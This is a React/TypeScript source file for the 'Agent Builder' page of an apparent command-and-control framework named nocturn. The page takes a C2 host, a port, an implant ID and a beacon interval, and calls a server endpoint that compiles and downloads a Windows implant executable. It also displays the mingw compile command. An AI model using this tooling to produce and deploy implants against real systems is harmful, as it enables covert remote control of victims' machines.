import { useState } from 'react'
import api from '../lib/api'
import Navbar from '../components/Navbar'

type BuildStatus = 'idle' | 'building' | 'success' | 'error'

function Corner({ pos }: { pos: 'tl' | 'tr' | 'bl' | 'br' }) {
  const s = 12, t = '1px', c = 'rgba(255,101,0,0.4)'
  const base: React.CSSProperties = { position: 'absolute', width: s, height: s }
  const styles: Record<string, React.CSSProperties> = {
    tl: { top: 0,    left: 0,  borderTop:    `${t} solid ${c}`, borderLeft:   `${t} solid ${c}` },
    tr: { top: 0,    right: 0, borderTop:    `${t} solid ${c}`, borderRight:  `${t} solid ${c}` },
    bl: { bottom: 0, left: 0,  borderBottom: `${t} solid ${c}`, borderLeft:   `${t} solid ${c}` },
    br: { bottom: 0, right: 0, borderBottom: `${t} solid ${c}`, borderRight:  `${t} solid ${c}` },
  }
  return <div style={{ ...base, ...styles[pos] }} />
}

function Field({ label, hint, children }: { label: string; hint?: string; children: React.ReactNode }) {
  return (
    <div>
      <label style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, letterSpacing: '0.25em', color: 'rgba(255,255,255,0.25)', display: 'block', marginBottom: 10, textTransform: 'uppercase' }}>
        {label}
      </label>
      {children}
      {hint && <p style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: 'rgba(255,255,255,0.15)', marginTop: 6, letterSpacing: '0.05em' }}>{hint}</p>}
    </div>
  )
}

export default function Builder() {
  const [serverHost, setServerHost] = useState('nocturn.roadmvn.com')
  const [serverPort, setServerPort] = useState(1234)
  const [agentId, setAgentId] = useState('agent-001')
  const [delayMs, setDelayMs] = useState(3000)
  const [status, setStatus] = useState<BuildStatus>('idle')
  const [errorMsg, setErrorMsg] = useState('')

  const handleBuild = async () => {
    setStatus('building')
    setErrorMsg('')
    try {
      const res = await api.post('/build-agent', {
        server_host: serverHost,
        server_port: serverPort,
        agent_id: agentId,
        delay_ms: delayMs,
      }, { responseType: 'blob' })
      const url = URL.createObjectURL(res.data)
      const a = document.createElement('a')
      a.href = url
      a.download = `nocturn-${agentId}.exe`
      document.body.appendChild(a)
      a.click()
      document.body.removeChild(a)
      URL.revokeObjectURL(url)
      setStatus('success')
    } catch (err: unknown) {
      const axiosErr = err as { response?: { data?: Blob } }
      let msg = 'Compilation failed'
      if (axiosErr.response?.data) {
        try {
          const text = await axiosErr.response.data.text()
          const json = JSON.parse(text)
          msg = json.error || msg
          if (json.details) msg += `\n${json.details}`
        } catch { /* ignore */ }
      }
      setErrorMsg(msg)
      setStatus('error')
    }
  }

  const buildCommand = [
    `x86_64-w64-mingw32-gcc agent.c \\`,
    `  -DSERVER_HOST=\\"${serverHost}\\" \\`,
    `  -DSERVER_PORT=${serverPort} \\`,
    `  -DAGENT_ID=\\"${agentId}\\" \\`,
    `  -DDELAY_MS=${delayMs} \\`,
    `  -o nocturn-${agentId}.exe \\`,
    `  -static -lws2_32 -lwinhttp`,
  ].join('\n')

  const inputStyle: React.CSSProperties = {
    width: '100%', padding: '11px 14px',
    fontFamily: "'JetBrains Mono', monospace",
    fontSize: 12, color: '#FF6500',
    background: 'rgba(4,4,6,0.8)',
    border: '1px solid rgba(255,101,0,0.15)',
    borderRadius: 2, outline: 'none',
    letterSpacing: '0.04em',
    boxSizing: 'border-box',
    transition: 'border-color 0.2s',
  }

  return (
    <div style={{ minHeight: '100vh', background: 'var(--bg-primary)', position: 'relative' }}>
      <div className="noise-overlay" />
      <Navbar />

      <main style={{ maxWidth: 760, margin: '0 auto', padding: '32px 24px' }}>

        {/* Header */}
        <div style={{ marginBottom: 32 }}>
          <p style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: 'rgba(255,101,0,0.5)', letterSpacing: '0.25em', textTransform: 'uppercase', margin: '0 0 6px' }}>
            // PAYLOAD FACTORY
          </p>
          <h1 style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 18, fontWeight: 700, color: '#F0F0F0', letterSpacing: '0.15em', margin: 0, textTransform: 'uppercase' }}>
            AGENT BUILDER
          </h1>
          <div style={{ width: 32, height: 1, background: 'linear-gradient(90deg, #FF6500, transparent)', marginTop: 12 }} />
        </div>

        {/* Form card */}
        <div style={{ position: 'relative', background: 'rgba(8,4,6,0.85)', border: '1px solid rgba(255,101,0,0.12)', borderRadius: 2, padding: '32px 28px', display: 'flex', flexDirection: 'column', gap: 28 }}>
          <Corner pos="tl" /><Corner pos="tr" /><Corner pos="bl" /><Corner pos="br" />

          {/* C2 Server */}
          <Field label="C2 Server Host" hint="// IP address or domain the agent will beacon to">
            <input
              type="text"
              value={serverHost}
              onChange={e => setServerHost(e.target.value)}
              placeholder="nocturn.roadmvn.com"
              style={inputStyle}
              onFocus={e => e.currentTarget.style.borderColor = 'rgba(255,101,0,0.5)'}
              onBlur={e => e.currentTarget.style.borderColor = 'rgba(255,101,0,0.15)'}
            />
          </Field>

          {/* Port */}
          <Field label="API Port">
            <input
              type="number"
              value={serverPort}
              onChange={e => setServerPort(Number(e.target.value))}
              style={inputStyle}
              onFocus={e => e.currentTarget.style.borderColor = 'rgba(255,101,0,0.5)'}
              onBlur={e => e.currentTarget.style.borderColor = 'rgba(255,101,0,0.15)'}
            />
          </Field>

          {/* Agent ID */}
          <Field label="Agent Identifier" hint="// unique ID for this implant (ex: agent-001, agent-lab)">
            <input
              type="text"
              value={agentId}
              onChange={e => setAgentId(e.target.value)}
              placeholder="agent-001"
              style={inputStyle}
              onFocus={e => e.currentTarget.style.borderColor = 'rgba(255,101,0,0.5)'}
              onBlur={e => e.currentTarget.style.borderColor = 'rgba(255,101,0,0.15)'}
            />
          </Field>

          {/* Beacon interval */}
          <Field label={`Beacon Interval — ${delayMs}ms`}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: 'rgba(255,255,255,0.2)', whiteSpace: 'nowrap' }}>500ms</span>
              <input
                type="range" min={500} max={15000} step={500}
                value={delayMs}
                onChange={e => setDelayMs(Number(e.target.value))}
                style={{ flex: 1, accentColor: '#FF6500', cursor: 'pointer' }}
              />
              <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: 'rgba(255,255,255,0.2)', whiteSpace: 'nowrap' }}>15000ms</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 4 }}>
              <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 8, color: 'rgba(255,45,85,0.4)', letterSpacing: '0.1em' }}>AGGRESSIVE</span>
              <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 8, color: 'rgba(0,255,136,0.4)', letterSpacing: '0.1em' }}>STEALTH</span>
            </div>
          </Field>

          {/* Config preview */}
          <div>
            <p style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, letterSpacing: '0.25em', color: 'rgba(255,255,255,0.2)', textTransform: 'uppercase', margin: '0 0 10px' }}>
              Config Preview
            </p>
            <div style={{ background: '#020202', border: '1px solid rgba(255,101,0,0.1)', borderRadius: 2, padding: '16px', fontFamily: "'JetBrains Mono', monospace", fontSize: 11, lineHeight: 1.8 }}>
              <div style={{ color: 'rgba(255,255,255,0.2)' }}>// nocturn agent configuration</div>
              {[
                ['SERVER_HOST', `"${serverHost}"`],
                ['SERVER_PORT', String(serverPort)],
                ['AGENT_ID', `"${agentId}"`],
                ['DELAY_MS', String(delayMs)],
              ].map(([key, val]) => (
                <div key={key}>
                  <span style={{ color: '#FF6500', opacity: 0.7 }}>#define </span>
                  <span style={{ color: '#00ff88' }}>{key}</span>
                  <span style={{ color: 'rgba(255,255,255,0.5)' }}> {val}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Build command */}
          <div>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 10 }}>
              <p style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, letterSpacing: '0.25em', color: 'rgba(255,255,255,0.2)', textTransform: 'uppercase', margin: 0 }}>
                Compile Command
              </p>
              <span style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: '#00ff88', background: 'rgba(0,255,136,0.07)', border: '1px solid rgba(0,255,136,0.2)', borderRadius: 2, padding: '2px 8px', letterSpacing: '0.1em' }}>
                mingw-w64
              </span>
            </div>
            <div style={{ background: '#020202', border: '1px solid rgba(0,255,136,0.1)', borderRadius: 2, padding: '16px', overflowX: 'auto' }}>
              <pre style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 11, color: '#00ff88', margin: 0, opacity: 0.7, lineHeight: 1.8 }}>
                {buildCommand}
              </pre>
            </div>
          </div>

          {/* Status messages */}
          {status === 'success' && (
            <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 11, color: '#00ff88', background: 'rgba(0,255,136,0.05)', border: '1px solid rgba(0,255,136,0.2)', borderRadius: 2, padding: '12px 16px', letterSpacing: '0.05em' }}>
              ✓ &nbsp;Agent compiled — downloading: nocturn-{agentId}.exe
            </div>
          )}
          {status === 'error' && (
            <div style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 11, color: '#FF2D55', background: 'rgba(255,45,85,0.05)', border: '1px solid rgba(255,45,85,0.2)', borderRadius: 2, padding: '12px 16px', letterSpacing: '0.05em', whiteSpace: 'pre-wrap' }}>
              ✕ &nbsp;{errorMsg}
            </div>
          )}

          {/* Build button */}
          <button
            onClick={handleBuild}
            disabled={status === 'building'}
            style={{
              width: '100%', padding: '14px 0',
              fontFamily: "'JetBrains Mono', monospace",
              fontSize: 11, letterSpacing: '0.28em', textTransform: 'uppercase',
              background: status === 'building' ? 'transparent' : 'rgba(255,101,0,0.08)',
              border: `1px solid ${status === 'building' ? 'rgba(255,101,0,0.15)' : 'rgba(255,101,0,0.55)'}`,
              borderRadius: 2,
              color: status === 'building' ? 'rgba(255,255,255,0.2)' : '#FF6500',
              cursor: status === 'building' ? 'not-allowed' : 'pointer',
              transition: 'all 0.2s', position: 'relative', overflow: 'hidden',
            }}
            onMouseEnter={e => { if (status !== 'building') { e.currentTarget.style.background = 'rgba(255,101,0,0.14)'; e.currentTarget.style.boxShadow = '0 0 18px rgba(255,101,0,0.2)' } }}
            onMouseLeave={e => { if (status !== 'building') { e.currentTarget.style.background = 'rgba(255,101,0,0.08)'; e.currentTarget.style.boxShadow = 'none' } }}
          >
            {status === 'building' ? '// COMPILING...' : '// COMPILE & DOWNLOAD'}
            {status !== 'building' && <div className="btn-scan" />}
          </button>

          <p style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: 9, color: 'rgba(255,255,255,0.1)', textAlign: 'center', letterSpacing: '0.1em', margin: 0 }}>
            requires mingw-w64 on the nocturn server
          </p>
        </div>
      </main>
    </div>
  )
}
